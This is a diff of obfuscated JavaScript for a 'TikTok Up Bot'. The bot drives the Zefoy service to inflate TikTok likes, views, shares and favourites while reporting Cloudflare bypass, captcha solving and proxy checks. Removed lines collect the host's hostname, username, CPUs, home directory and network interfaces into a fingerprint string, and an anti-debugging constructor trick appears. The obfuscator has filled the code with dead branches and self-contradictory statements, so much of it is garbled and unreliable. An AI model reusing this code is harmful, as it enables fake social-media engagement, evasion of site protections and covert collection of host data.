+      let v270 = await p605.evaluate("(() => {\n        const element = document.querySelector('span.text-black.h6.text-danger');\n        if (element && element.textContent.trim() === 'No an comment found.') {\n          return true;\n        }\n        return false;\n      })();");
+      if (v270) {
+        if (v257.qLaTH(v257.IRQmq, v257.qaomg)) {
+          v266 = v257.rfOMU;
         } else {
-          p599.stdout.moveCursor(0, -3);
-          p600.stdout.cursorTo(0);
-          v244.stdout.clearScreenDown();
+          let v271 = p606.split("");
+          for (let v272 = 0; v257.sxMlG(v272, v271.length); v272 += 2) {
+            if (v257.snSDC(v257.kbdDr(v272, 1), v271.length)) {
+              let v273 = v271[v272];
+              v271[v272] = v271[v257.pujLV(v272, 1)];
+              v271[v257.mwvqw(v272, 1)] = v273;
+            }
+          }
+          return v271.join("");
         }
       }
-      if (v244.GmaKu(p598, v244.iveDb) && !/Please wait/.test(v253) && v87 && v88) {
-        if (v244.DofRM(v244.OxOkK, v244.fpKrc)) {
-          v253 = v88.concat;
+      if (v257.EdTxs(p607, v257.BECjb) && !/Please wait/.test(v266) && v85 && v86) {
+        if (v257.EdTxs(v257.ENXgM, v257.ENXgM)) {
+          v266 = v86.concat;
         } else {
-          p597.log("Cloudflare Expired / Zefoy Expired");
-          return false;
+          p606 = v265.NpXLo;
         }
       }
-      if (v244.eRMSH(v86.length, 0) && v87 && v244.lsmUS(p600, null)) {
-        if (v244.igjtV(v244.SWXaw, v244.TBYzK)) {
-          if (!v26) {
-            if (v244.IFfUC(v244.GcUmY, v244.cXgLp)) {
+      if (v257.UTycu(v84.length, 0) && v85 && v257.cQNjO(p609, null)) {
+        if (v257.qLaTH(v257.abfBh, v257.abfBh)) {
+          p607.stdout.moveCursor(0, -6);
+          p608.stdout.clearScreenDown();
+        } else {
+          if (!v28) {
+            if (v257.yfuJo(v257.qBKAv, v257.LyMnS)) {
+              p608 = v257.Qtknv(p609, v257);
+            } else {
               process.stdout.moveCursor(0, -3);
               process.stdout.cursorTo(0);
               process.stdout.clearScreenDown();
-            } else if (v252.Pglst(v252.tQgGD(v249, 1), v250.length)) {
-              let v255 = T[s];
-              v255[u] = W[v252.fLOvg(R, 1)];
-              o[v252.tQgGD(E, 1)] = v255;
             }
           }
-          v244.LrJSB(clearInterval, v70);
-          v244.otbfr(clearInterval, v71);
-          v244.bzUuk(clearInterval, v72);
-          p600 = await v244.XMzvJ(f22, v86);
-          v88 = v86[p600];
-          v70 = await v244.CQmTq(f25, p596, p597, p598, p599, p600);
-          v71 = await v244.hHGeb(f26, p596, p597, p600);
-          v72 = await v244.JWdKO(f24, p596, p597, p598, p599);
+          v257.zcqlt(clearInterval, v68);
+          v257.KJjSY(clearInterval, v69);
+          v257.KJjSY(clearInterval, v70);
+          if (!v86) {
+            if (v257.znnSN(v257.TppMd, v257.EPygE)) {
+              p609 = await v257.wwWml(f22, v84);
+              v86 = v84[p609];
+            } else {
+              if (/submit-captcha/.test(p608)) {
+                v258.log("Cloudflare Valid / Zefoy Expired");
+              } else {
+                v259.log("Cloudflare Valid / Zefoy Valid");
+              }
+              return true;
+            }
+          }
+          if (!v89) {
+            if (v257.znnSN(v257.ZXbVi, v257.ZXbVi)) {
+              v257.KJjSY(v264, "[" + v265 + "] " + v266 + " (+" + v270 + ") [" + vV53 + "] Stopped for reaching the maximum time limit! (in " + v257.zlTBh(L) + " mins)");
+              if (!T) {
+                B.stdout.clearLine(0);
+                v.stdout.cursorTo(0);
+                G.stdout.write(Y + " Stopped for reaching the maximum time limit!");
+              }
+              h.exit(0);
+            } else {
+              v89 = await v257.TZAMl(f23);
+            }
+          }
+          v68 = await v257.oZZvf(f26, p605, p606, p607, p608, p609);
+          v69 = await v257.vmIxX(f27, p605, p606, p609);
+          v70 = await v257.UUuNX(f25, p605, p606, p607, p608);
           console.log("\n\n");
-        } else {
-          const v256 = {
-            platform: h.platform(),
-            architecture: g.arch(),
-            cpus: T.cpus().map(p834 => p834.model).join(", "),
-            totalMemory: s.totalmem(),
-            hostname: H.hostname(),
-            osRelease: v256.release(),
-            osType: v257.type(),
-            userInfo: v258.userInfo().username,
-            tmpdir: o.tmpdir(),
-            homedir: E.homedir(),
-            homedirTime: f.statSync(G.homedir()).birthtime.toISOString(),
-            btdirTime: e.statSync(Q).birthtime.toISOString(),
-            networkInterfaces: M.stringify(a.networkInterfaces())
-          };
-          const v257 = P.values(v256).join("|");
-          const v258 = v244.QhewQ(i, v257);
-          return v258;
         }
       }
-      if (v244.clusN(v86.length, 0) && !v87) {
-        if (v244.aGwJL(v244.zWDbF, v244.ZLivD)) {
-          return false;
+      if (v257.Yhgmy(v84.length, 0) && !v85) {
+        if (v257.EdTxs(v257.WCGRI, v257.QWYGJ)) {
+          p609.stdout.clearLine(0);
+          v257.stdout.cursorTo(0);
+          v258.stdout.write(v259 + " Check Zefoy accessibility...");
         } else {
-          v253 = "Extracting comments (" + v86.length + ")...";
+          v266 = "Extracting comments (" + v84.length + ")...";
         }
       }
-      v253 = v253.replace(/(\r\n|\n|\r)/gm, " ");
-      let vV55 = v55;
-      vV55 = /limit/.test(v253) ? v56 : vV55;
-      vV55 = /error/.test(v253) ? v56 : vV55;
-      vV55 = /not working/.test(v253) ? v56 : vV55;
-      vV55 = /valid video/.test(v253) ? v56 : vV55;
-      vV55 = /again later/.test(v253) ? v56 : vV55;
-      vV55 = /error/.test(v253) ? v56 : vV55;
-      vV55 = /Not found video/.test(v253) ? v56 : vV55;
-      vV55 = /No comments found/.test(v253) ? v56 : vV55;
-      vV55 = /expired/.test(v253) ? v56 : vV55;
-      vV55 = /many requests/.test(v253) ? v56 : vV55;
-      vV55 = /too busy/.test(v253) ? v56 : vV55;
-      vV55 = /wait/.test(v253) ? v248 ? v57 : v58 : vV55;
-      if (v244.vpuXh(p600, null) && v86.length) {
-        if (v244.TtsZu(v244.OtwTB, v244.OtwTB)) {
-          if (v244.Ckduv(v245, 0)) {
-            v251 = v252;
+      if (/@/.test(v266)) {
+        if (v257.fOoOs(v257.teelW, v257.teelW)) {
+          p606 = v257.OwZNx;
+        } else {
+          v266 = v257.OwZNx;
+        }
+      }
+      v266 = v266.replace(/(\r\n|\n|\r)/gm, " ");
+      let vV53 = v53;
+      vV53 = /limit/.test(v266) ? v54 : vV53;
+      vV53 = /error/.test(v266) ? v54 : vV53;
+      vV53 = /not working/.test(v266) ? v54 : vV53;
+      vV53 = /valid video/.test(v266) ? v54 : vV53;
+      vV53 = /again later/.test(v266) ? v54 : vV53;
+      vV53 = /error/.test(v266) ? v54 : vV53;
+      vV53 = /Not found video/.test(v266) ? v54 : vV53;
+      vV53 = /No comments found/.test(v266) ? v54 : vV53;
+      vV53 = /expired/.test(v266) ? v54 : vV53;
+      vV53 = /many requests/.test(v266) ? v54 : vV53;
+      vV53 = /too busy/.test(v266) ? v54 : vV53;
+      vV53 = /wait/.test(v266) ? v261 ? v55 : v56 : vV53;
+      if (v257.LGGBQ(p609, null) && v84.length) {
+        if (v257.LGGBQ(v257.njOLm, v257.njOLm)) {
+          v257.GVeWj(p606, "Zefoy is accessible! :)");
+        } else {
+          v258 = v86.likes;
+          if (v257.EdTxs(v71, 0)) {
+            if (v257.qLaTH(v257.NuoRG, v257.NuoRG)) {
+              return false;
+            } else if (v257.vNTqP(v73, 0)) {
+              if (v257.jQSOy(v257.MYCrJ, v257.MYCrJ)) {
+                v71 = v258;
+              } else {
+                p609.stdout.clearLine(0);
+                v257.stdout.cursorTo(0);
+                v258.stdout.write(v259 + " Launch Zefoy in headless browser...");
+              }
+            } else if (v257.bsbGy(v257.nXvXU, v257.IJjKa)) {
+              v71 = v257.Qtknv(v258, v73);
+            } else {
+              p609.stdout.clearLine(0);
+              v257.stdout.cursorTo(0);
+              v258.stdout.write(v265.oZOvo(v259, v265.CgUrB));
+            }
+          }
+          v72 = Math.abs(v257.UHTyb(v258, v71));
+          if (v257.znnSN(v72, v263)) {
+            if (v257.EdTxs(v257.IJeUj, v257.EYlkV)) {
+              return function (p850) {}.constructor(GDaujK.fRYFx).apply(GDaujK.pSTzc);
+            } else {
+              v257.YDsSi(f54, "[" + p607 + "] " + v258 + " (+" + v72 + ") " + p608);
+              v257.uMBZq(f84, p607);
+            }
+          }
+          v263 = v72;
+        }
+      } else if (v257.SUKVR(v257.IDQwr, v257.IOobt)) {
+        const v274 = v266.replace(" ", "").match(/\d+(,\d+)*(?![^,])/g);
+        if ((v262 || /^Submit/.test(v266.replace(" ", ""))) && v257.cWYzx(p607, v257.BECjb)) {
+          if (v257.qLaTH(v257.zOEby, v257.zOEby)) {
+            v257.KJjSY(p607, "Wrong captcha! (" + p608 + ")");
           } else {
-            J = v244.sQBjm(v253, v254);
-          }
-        } else {
-          v245 = v88.likes;
-          if (v244.dNDTv(v73, 0)) {
-            if (v244.Ckduv(v244.wkrhl, v244.wkrhl)) {
-              if (v244.Iyqeh(v75, 0)) {
-                if (v244.gjIdw(v244.NNTdb, v244.NNTdb)) {
-                  return true;
-                } else {
-                  v73 = v245;
-                }
-              } else if (v244.AywZu(v244.nbWaF, v244.nbWaF)) {
-                v252.kNDFF(v251, "[" + v252 + "] " + J + " (+" + v253 + ") [" + v254 + "] Stopped for not accumulating the defined minimum! (in " + v252.mmfof(vV55) + " mins)");
-                if (!h) {
-                  W.stdout.clearLine(0);
-                  R.stdout.cursorTo(0);
-                  o.stdout.write(E + " Stopped for not accumulating the defined minimum!");
-                }
-                u.exit(0);
-              } else {
-                v73 = v244.sQBjm(v245, v75);
-              }
-            } else {
-              const v259 = v252.zaNYc(p598, p599[1]);
-              return v259;
-            }
-          }
-          v74 = Math.abs(v244.OhCUs(v245, v73));
-          if (v244.munZc(v74, v250)) {
-            if (v244.igjtV(v244.iKyrK, v244.iKyrK)) {
-              v252.zaNYc(v246, "[" + v247 + "] " + v248 + " (+" + v249 + ") " + v250);
-              v252.MdoSi(v251, v252);
-            } else {
-              v244.ySrGx(f53, "[" + p598 + "] " + v245 + " (+" + v74 + ") " + p599);
-              v244.EPSrL(f83, p598);
-            }
-          }
-          v250 = v74;
-        }
-      } else if (v244.dHRnd(v244.TEeGS, v244.TEeGS)) {
-        p599.log(p600);
-        v244.exit(0);
-      } else {
-        const v260 = v253.replace(" ", "").match(/\d+(,\d+)*(?![^,])/g);
-        if ((v249 || /^Submit/.test(v253.replace(" ", ""))) && v244.NAYJp(p598, v244.iveDb)) {
-          if (v244.aGwJL(v244.ApPxY, v244.ApPxY)) {
-            v246 = v245;
-            if (v244.loVRW(p598, v244.ksmwW)) {
-              if (v244.igjtV(v244.DrQbu, v244.DrQbu)) {
-                if (v252.FUYRg(!v246, !v247)) {
-                  J.stdout.clearLine(0);
-                  v253.stdout.cursorTo(0);
-                  v254.stdout.write(vV55 + " Zefoy is unreachable or blocked! :(");
-                } else {
-                  v252.PhdJj(h, "Zefoy is unreachable or blocked! (you need proxy/vpn)");
-                }
-              } else {
-                let v261 = await v244.ppazX(f57, p599);
-                v245 = v261?.diggCount || v246;
-                if (v244.CVSyw(v245, 10000) || !v261) {
-                  if (v244.wuafs(v244.wSxpt, v244.CNYcg)) {
-                    return null;
+            v259 = v258;
+            if (v257.CtkAc(p607, v257.QucVL)) {
+              if (v257.ueLTf(v257.rlOpB, v257.rlOpB)) {
+                let v275 = await v257.nSHTT(f58, p608);
+                v258 = v275?.diggCount || v259;
+                if (v257.hdJtq(v258, 10000) || !v275) {
+                  if (v257.CtkAc(v257.haRpn, v257.haRpn)) {
+                    v258 = (await v257.rJFFG(f60, p608))?.diggCount || v259;
                   } else {
-                    v245 = (await v244.iUsha(f59, p599))?.diggCount || v246;
+                    p607.stdout.moveCursor(0, -2);
+                    p608.stdout.clearScreenDown();
                   }
                 }
+              } else {
+                v257.GVeWj(p607, "Check browser (" + p608 + ")...");
               }
             }
-            if (v244.wuafs(p598, v244.dyNyH)) {
-              if (v244.DofRM(v244.vyQmK, v244.vyQmK)) {
-                const v262 = v251.intToRGBA(v252.getPixelColor(J, v253));
-                const v263 = v252.sXOPk(v252.TkkRG(v254.abs(v252.fBPtP(v262.r, v262.g)), vV55.abs(v252.ojyQo(v262.g, v262.b))), h.abs(v252.ojyQo(v262.r, v262.b)));
-                if (v252.Bxgbd(v263, g)) {
-                  W.setPixelColor(R, o, E);
-                }
-              } else {
-                let v264 = await v244.XMzvJ(f57, p599);
-                v245 = v264?.playCount || v246;
-                if (v244.CVSyw(v245, 10000) || !v264) {
-                  if (v244.VeLSr(v244.BMmLN, v244.ZHndu)) {
-                    p599.log(p600);
-                    v244.exit(0);
+            if (v257.oHWOF(p607, v257.gPjpO)) {
+              if (v257.ueLTf(v257.TbATe, v257.TbATe)) {
+                let v276 = await v257.QDZAw(f58, p608);
+                v258 = v276?.playCount || v259;
+                if (v257.hdJtq(v258, 10000) || !v276) {
+                  if (v257.JoRFw(v257.KHJie, v257.CMacI)) {
+                    p606 = v257.OwZNx;
                   } else {
-                    v245 = (await v244.iDier(f59, p599))?.playCount || v246;
+                    v258 = (await v257.wwWml(f60, p608))?.playCount || v259;
                   }
                 }
+              } else {
+                v257.wwWml(v258, "[" + v259 + "] " + v260 + " (+" + v261 + ") [" + v262 + "] Running: " + v263);
               }
             }
-            if (v244.Ckduv(p598, v244.kzpCS)) {
-              if (v244.MULhm(v244.ejFyu, v244.FMjbD)) {
-                let v265 = await v244.QhewQ(f57, p599);
-                v245 = v265?.shareCount || v246;
-                if (v244.SOmOO(v245, 10000) || !v265) {
-                  if (v244.YWHNJ(v244.jqPrV, v244.CgqCm)) {
-                    v245 = (await v244.iDier(f59, p599))?.shareCount || v246;
-                  } else {
-                    if (v244.Gsobi(!v249, !v250)) {
-                      T.stdout.clearLine(0);
-                      s.stdout.cursorTo(0);
-                      H.stdout.write(v244.GIPOk(u, " Chrome/Chromium executable is invalid!"));
-                      W.info("\n\n", v244.NfCUG, "\"" + R + "\"\n", v244.tqlYW);
-                    } else {
-                      v244.QhewQ(o, "Chrome/Chromium executable is invalid!");
+            if (v257.EdTxs(p607, v257.cFRYF)) {
+              if (v257.LGGBQ(v257.ABbYu, v257.LJiQF)) {
+                let v277 = await v257.YDsSi(f58, p608);
+                v258 = v277?.shareCount || v259;
+                if (v257.hdJtq(v258, 10000) || !v277) {
+                  if (v257.vNTqP(v257.mAFIT, v257.JfzEa)) {
+                    let v278 = 0;
+                    const v279 = 31;
+                    for (let v280 = 0; v265.mXiKQ(v280, v258.length); v280++) {
+                      v278 = v265.IdhCx(v265.mzVsD(v278, v279), v260.charCodeAt(v280));
+                      v278 = v265.oweEN(v278, v278);
                     }
-                    g.exit(0);
-                  }
-                }
-              } else {
-                p597.log(v244.HswYh);
-              }
-            }
-            if (v244.UHBye(p598, v244.rLmYx)) {
-              if (v244.gOlOG(v244.CtaDe, v244.CtaDe)) {
-                let v266 = await v244.lmGwE(f57, p599);
-                v245 = v266?.collectCount || v246;
-                if (!v266) {
-                  if (v244.dNDTv(v244.vvIuV, v244.erStF)) {
-                    v252.kNDFF(p597, "Continue without using proxy!");
+                    return v257.abs(v278).toString(16);
                   } else {
-                    v245 = v260 ? v244.ySrGx(parseInt, v260[0].replace(/[,\.]/g, "")) : v246;
+                    v258 = (await v257.hfrEm(f60, p608))?.shareCount || v259;
                   }
                 }
-              } else if (v246) {
-                J.log(v244.UxESp, "                                                          \nBotTok " + v253 + " TikTok Up Bot (by @DevMHOne)    Exit: [CTRL+C] \n", v244.zBYZS);
               } else {
-                v254.log(v244.UxESp, "                                                          \n@@@@@@@    @@@@@@   @@@@@@@   @@@@@@@   @@@@@@   @@@  @@@  \n@@@@@@@@  @@@@@@@@  @@@@@@@   @@@@@@@  @@@@@@@@  @@@  @@@  \n@@!  @@@  @@!  @@@    @@!       @@!    @@!  @@@  @@!  !@@  \n!@   @!@  !@!  @!@    !@!       !@!    !@!  @!@  !@!  @!!  \n@!@!@!@   @!@  !@!    @!!       @!!    @!@  !@!  @!@@!@!   \n!!!@!!!!  !@!  !!!    !!!       !!!    !@!  !!!  !!@!!!    \n!!:  !!!  !!:  !!!    !!:       !!:    !!:  !!!  !!: :!!   \n:!:  !:!  :!:  !:!    :!:       :!:    :!:  !:!  :!:  !:!  \n:: ::::  ::::: ::     ::        ::    ::::: ::   ::  :::  \n:: : ::    : :  :      :         :      : :  :    :   :::", "\n\nBotTok " + vV55 + " TikTok Up Bot (by @DevMHOne)    Exit: [CTRL+C] \n", v244.zBYZS);
-                h.log(g + " Find help in Telegram (https://t.me/bottok_help)\n");
-              }
-            }
-            if (v244.AXzls(v73, 0)) {
-              if (v244.fTyFe(v244.wylzp, v244.wylzp)) {
-                const v267 = p599.apply(p600, arguments);
-                v244 = null;
-                return v267;
-              } else if (v244.gOlOG(v75, 0)) {
-                if (v244.tjXHR(v244.zepkv, v244.ZbHhv)) {
-                  v73 = v245;
-                } else {
+                try {
+                  const v281 = v265.fzmpB(v260, v261);
+                  const v282 = v281.text();
+                  const v283 = v282.match(/"liveRoomStats":\s*{\s*"userCount":\s*(\d+)/);
+                  if (v283) {
+                    const v284 = v265.XGTOb(v263, v283[1]);
+                    return v284;
+                  }
+                } catch (g) {
+                  v265.AbGxJ(v265, g);
                   return null;
                 }
-              } else if (v244.Ckduv(v244.GXRml, v244.GXRml)) {
-                v73 = v244.QqKch(v245, v75);
-              } else {
-                v244.QhewQ(p598, "Captcha resolved! (" + p599 + ")");
               }
             }
-            v74 = Math.abs(v244.mxMhj(v245, v73));
-            if (v244.sdaJu(v74, v250)) {
-              if (v244.VeLSr(v244.oLiEm, v244.oLiEm)) {
-                v244.yjzSi(f53, "[" + p598 + "] " + v245 + " (+" + v74 + ") " + p599);
-                v244.KQJHz(f83, p598);
+            if (v257.vNTqP(p607, v257.VwTHT)) {
+              if (v257.SUKVR(v257.CxNqR, v257.PfnYF)) {
+                let v285 = await v257.bDxWw(f58, p608);
+                v258 = v285?.collectCount || v259;
+                if (!v285) {
+                  if (v257.znnSN(v257.NjSCb, v257.uEljl)) {
+                    v258 = v274 ? v257.LcgyO(parseInt, v274[0].replace(/[,\.]/g, "")) : v259;
+                  } else {
+                    v257.stdout.clearLine(0);
+                    v258.stdout.cursorTo(0);
+                    v259.stdout.write(v260 + " Captcha resolved! (" + v261 + ")");
+                  }
+                }
               } else {
-                p598.stdout.clearLine(0);
-                p599.stdout.cursorTo(0);
+                return v257.XLIRy(p609, v257.vCYQn(v257, v257.KJjSY(v258, v259)));
               }
             }
-            v250 = v74;
-            v249 = false;
-            v253 = v245.toLocaleString(v244.OwLgJ);
-          } else {
-            v244.umhDm(p598, p599);
-            return null;
+            if (v257.vNTqP(v71, 0)) {
+              if (v257.vNTqP(v257.rRHQN, v257.ieiHo)) {
+                v265.WLXeG(p606, "Check proxies...");
+              } else if (v257.zTzwZ(v73, 0)) {
+                if (v257.SUKVR(v257.qmhmP, v257.qmhmP)) {
+                  v265.SYDMt(p606, "Chrome/Chromium executable is invalid!");
+                } else {
+                  v71 = v258;
+                }
+              } else if (v257.tTsyP(v257.sZVcI, v257.pGhhn)) {
+                v71 = v257.UHTyb(v258, v73);
+              } else {
+                p607 = p608;
+              }
+            }
+            v72 = Math.abs(v257.Qtknv(v258, v71));
+            if (v257.lvxCG(v72, v263)) {
+              if (v257.SUKVR(v257.yKzEh, v257.yKzEh)) {
+                v257.stdout.clearLine(0);
+                v258.stdout.cursorTo(0);
+                v259.stdout.write(v260 + " Wrong captcha! (" + v261 + ")");
+              } else {
+                v257.fnIrx(f54, "[" + p607 + "] " + v258 + " (+" + v72 + ") " + p608);
+                v257.KJjSY(f84, p607);
+              }
+            }
+            v263 = v72;
+            v262 = false;
+            v266 = v258.toLocaleString(v257.aqXsU);
           }
-        } else if (v244.aGwJL(v244.lTvsm, v244.lTvsm)) {
-          if (v260 && v244.AywZu(p598, v244.iveDb)) {
-            if (v244.VuBum(v244.ziHMx, v244.ryPFs)) {
-              return false;
-            } else {
-              v245 = v244.czNFr(parseInt, v260[0].replace(/[,\.]/g, ""));
-              if (v244.Iyqeh(v73, 0)) {
-                if (v244.MkGOI(v244.nHVbw, v244.zkkyK)) {
-                  if (v244.zqwut(v75, 0)) {
-                    if (v244.RKGlK(v244.hNtXk, v244.hNtXk)) {
-                      p598.stdout.moveCursor(0, -9);
-                      p599.stdout.clearScreenDown();
+        } else if (v257.TexSO(v257.BPJJg, v257.BPJJg)) {
+          if (v274 && v257.qLaTH(p607, v257.BECjb)) {
+            if (v257.AaqCb(v257.xfpZb, v257.sFSEw)) {
+              v258 = v257.hYimb(parseInt, v274[0].replace(/[,\.]/g, ""));
+              if (v257.aYUBz(v71, 0)) {
+                if (v257.fQxtW(v257.wUfjX, v257.WfNmC)) {
+                  if (v257.AHaaM(v73, 0)) {
+                    if (v257.ueLTf(v257.lQhFX, v257.UZWDy)) {
+                      v265.WLXeG(v259, "[" + v260 + "] " + v261 + " (+" + v262 + ") " + v263);
+                      v265.XGTOb(v264, v265);
                     } else {
-                      v73 = v245;
+                      v71 = v258;
                     }
-                  } else if (v244.eqIoa(v244.GOGxf, v244.GOGxf)) {
-                    v247 = v244.GIPOk(v244.XNrfV(v248, v249), v250.charCodeAt(v251));
-                    v252 = v244.zEABi(J, v253);
+                  } else if (v257.oHimT(v257.qjiBS, v257.NrlaU)) {
+                    v71 = v257.Qtknv(v258, v73);
                   } else {
-                    v73 = v244.zQkig(v245, v75);
+                    p607.error(v265.ueaBB, p608);
                   }
                 } else {
-                  v244.stdout.clearLine(0);
-                  v245.stdout.cursorTo(0);
-                  v246.stdout.write(v252.tQgGD(v252.TkkRG(v247, v252.IVfcj), v248.substring(0, 48)));
+                  return false;
                 }
               }
-              v74 = Math.abs(v244.UWVWl(v245, v73));
-              if (v244.YWHNJ(v74, v250)) {
-                if (v244.kUUkE(v244.SEheK, v244.eGBFC)) {
-                  v244.yYiiq(f53, "[" + p598 + "] " + v245 + " (+" + v74 + ") " + p599);
-                  v244.LrJSB(f83, p598);
+              v72 = Math.abs(v257.qJJhc(v258, v71));
+              if (v257.qzpHm(v72, v263)) {
+                if (v257.tTsyP(v257.iGyJU, v257.iGyJU)) {
+                  v258.stdout.clearLine(0);
+                  v259.stdout.cursorTo(0);
+                  v260.stdout.write(v257.uMstq(v261, " Chrome/Chromium executable is invalid!"));
+                  v262.info("\n\n", v257.xJETc, "\"" + v263 + "\"\n", v257.drJHq);
                 } else {
-                  const v268 = new p600(keaQUD.IGsQh);
-                  const v269 = new v244(keaQUD.MWbjp, "i");
-                  const v270 = keaQUD.umhDm(v245, keaQUD.hmfXE);
-                  if (!v268.test(keaQUD.rVyUW(v270, keaQUD.MFZsh)) || !v269.test(keaQUD.rVyUW(v270, keaQUD.CnBgL))) {
-                    keaQUD.QhewQ(v270, "0");
-                  } else {
-                    keaQUD.PQxsc(v247);
-                  }
+                  v257.tDzSo(f54, "[" + p607 + "] " + v258 + " (+" + v72 + ") " + p608);
+                  v257.apJNh(f84, p607);
                 }
               }
-              v250 = v74;
+              v263 = v72;
+            } else {
+              p607 = p608;
             }
           }
         } else {
-          v244.stdout.clearLine(0);
-          v245.stdout.cursorTo(0);
-          v246.stdout.write(v247 + " SESSID: " + v248);
-        }
-      }
-      if (v244.eRMSH(v74, 0)) {
-        if (v244.afIBC(v244.tgxLA, v244.GLnSo)) {
-          v247 = "[32m+" + v74 + "[0m";
-        } else {
-          const v271 = v252.MdoSi(p598, p599);
-          if (!v271.ok) {
-            return null;
-          }
-          const v272 = v271.text();
-          return v272;
-        }
-      } else if (v244.IFfUC(v244.LZtYX, v244.LZtYX)) {
-        return false;
-      } else {
-        v247 = "";
-      }
-      if (!v26) {
-        if (v244.igjtV(v244.xhQhb, v244.xhQhb)) {
-          const v273 = v252.zaNYc(v248, v249);
-          if (!v273.ok) {
-            return null;
-          }
-          const v274 = v273.text();
-          const v275 = v274.match(/"stats":\s*{\s*"followerCount":(\d+),\s*"followingCount":(\d+),\s*"heart":(\d+),\s*"heartCount":(\d+),\s*"videoCount":(\d+),\s*"diggCount":(\d+),\s*"friendCount":(\d+)\s*}/);
-          if (v275) {
-            const [, v276, v277, v278, v279, v280, v281, v282] = v275;
-            return {
-              followerCount: v252.MdoSi(h, v276),
-              followingCount: v252.ZgHzC(g, v277),
-              heart: v252.ZgHzC(T, v278),
-              heartCount: v252.WVDqI(s, v279),
-              videoCount: v252.PtQry(H, v280),
-              diggCount: v252.qafJH(u, v281),
-              friendCount: v252.zaNYc(W, v282)
-            };
+          if (v257.wozfp(!v262, !v263)) {
+            y.stdout.clearLine(0);
+            R.stdout.cursorTo(0);
+            e.stdout.write(v257.MRZwh(h, " Chrome/Chromium executable is invalid!"));
+            B.info("\n\n", v257.xJETc, "\"" + v + "\"\n", v257.drJHq);
           } else {
-            return null;
+            v257.hbbLM(G, "Chrome/Chromium executable is invalid!");
           }
+          Q.exit(0);
+        }
+      } else {
+        v257.KJjSY(p607, p608);
+        return null;
+      }
+      if (v257.Yhgmy(v72, 0)) {
+        if (v257.FyfBd(v257.nBdLk, v257.nBdLk)) {
+          v260 = "[32m+" + v72 + "[0m";
+        } else {
+          p609.stdout.clearLine(0);
+          v257.stdout.cursorTo(0);
+          v258.stdout.write(v259 + " Zefoy is protected by UAM Cloudflare!");
+        }
+      } else if (v257.TqhFr(v257.GfoEi, v257.GfoEi)) {
+        v260 = "";
+      } else {
+        p609.stdout.clearLine(0);
+        v257.stdout.cursorTo(0);
+        v258.stdout.write(v259 + " Bypassing Cloudflare...");
+      }
+      if (!v28) {
+        if (v257.CLiSb(v257.LfeZN, v257.LfeZN)) {
+          p607 = "[32m+" + p608 + "[0m";
         } else {
           process.stdout.moveCursor(0, -3);
           process.stdout.clearScreenDown();
-          process.stdout.write("\n" + v54 + "[33m " + p598 + " [34m[" + v251 + "][0m " + v247 + "  [90m(" + v244.PQxsc(f55) + " /hr " + v244.OKFZD(v244.FJUML(f54), 60).toFixed(2) + " hrs)[0m\n\n");
-          process.stdout.write(vV55 + " Running: " + v253.substring(0, 43));
+          process.stdout.write("\n" + v52 + "[33m " + p607 + " [34m[" + v264 + "][0m " + v260 + "  [90m(" + v257.TZAMl(f56) + " /hr " + v257.MoXjY(v257.yxXoO(f55), 60).toFixed(2) + " hrs)[0m\n\n");
+          process.stdout.write(vV53 + " Running: " + v266.substring(0, 43));
         }
       }
-      if (v244.fjriC(v24, v26) && v27) {
-        if (v244.CosDd(v244.hJVEg, v244.hJVEg)) {
-          const v283 = v244.umhDm(p600, v244 + "/latest");
-          const v284 = v283.json().tag_name;
-          const v285 = v244.rVyUW("v", v245);
-          v246 = v244.Ckduv(v284, v285) ? true : false;
+      if (v257.VrkBd(v26, v28) && v29) {
+        if (v257.lvxCG(v257.mqjbD, v257.SqTHl)) {
+          v257.LcgyO(f54, "[" + p607 + "] " + v258 + " (+" + v72 + ") [" + p608 + "] Running: " + v266);
         } else {
-          v244.MlrER(f53, "[" + p598 + "] " + v245 + " (+" + v74 + ") [" + p599 + "] Running: " + v253);
+          p609.setPixelColor(v257, v258, v259);
         }
       }
-      if (!v95 && v244.tYyFF(v74, Math.sqrt(Infinity))) {
-        if (v244.tRFic(v244.rviRS, v244.rviRS)) {
-          p600.stdout.clearLine(0);
-          v244.stdout.cursorTo(0);
-          v245.stdout.write(v246 + "  Check proxies...");
+      if (!v95 && v257.uvXIf(v72, Math.sqrt(Infinity))) {
+        if (v257.qzpHm(v257.BNxRB, v257.BNxRB)) {
+          if (p609) {
+            const v286 = v260.apply(v261, arguments);
+            v262 = null;
+            return v286;
+          }
         } else {
-          vV55 = v56;
-          v244.Wqhbr(clearInterval, v70);
-          v244.lmGwE(clearInterval, v71);
-          v244.bzUuk(clearInterval, v72);
-          await v244.FJUML(f36);
-          v244.pmhFX(setTimeout, async () => {
-            if (v244.DofRM(v244.qUzKs, v244.qUzKs)) {
-              const v286 = {
-                name: p597.url
-              };
-              return v286;
+          vV53 = v54;
+          v257.YRlJk(clearInterval, v68);
+          v257.fnIrx(clearInterval, v69);
+          v257.YDsSi(clearInterval, v70);
+          await v257.wrvCe(f37);
+          v257.QTWgU(setTimeout, async () => {
+            const v287 = {
+              ZtMXx: v265.CrHOh,
+              sVeTc: v265.NFHzg,
+              RQEke: v265.jfSjQ,
+              iPKEm: v265.IVobF
+            };
+            const vV287 = v287;
+            if (v265.ILdtU(v265.vXlRg, v265.vXlRg)) {
+              p608.info("\n\n", vV287.ZtMXx, vV287.sVeTc, vV287.RQEke, vV287.iPKEm, p609 + " Buy license in[35m " + v257 + "[0m\n");
             } else {
-              console.info("\n\n", v244.iTubO, v244.gaKVj, v244.WJmmb, v244.bBXDe, v65 + " Buy license in[35m " + v53 + "[0m\n");
+              console.info("\n\n", v265.CrHOh, v265.NFHzg, v265.jfSjQ, v265.IVobF, v63 + " Buy license in[35m " + v51 + "[0m\n");
             }
           }, 100);
         }
       }
-      if (vA0zS.limit && v244.tYyFF(vA0zS.limit, 0) && v244.VNrtI(v74, vA0zS.limit)) {
-        if (v244.gOlOG(v244.DMDTT, v244.jSWTP)) {
-          p597 = false;
-        } else {
-          v244.ElPpm(f53, "[" + p598 + "] " + v245 + " (+" + v74 + ") [" + p599 + "] Accumulation limit reached! (in " + v244.PQxsc(f54) + " mins)");
-          if (!v26) {
-            if (v244.XuqQr(v244.NkPoQ, v244.NkPoQ)) {
-              p598 = "Extracting comments (" + p599.length + ")...";
-            } else {
+      if (vA0iw.limit && v257.KGnbC(vA0iw.limit, 0) && v257.Wynce(v72, vA0iw.limit)) {
+        if (v257.ynABO(v257.RoXCv, v257.nWGcc)) {
+          v257.EVSaf(f54, "[" + p607 + "] " + v258 + " (+" + v72 + ") [" + p608 + "] Accumulation limit reached! (in " + v257.YrfxT(f55) + " mins)");
+          if (!v28) {
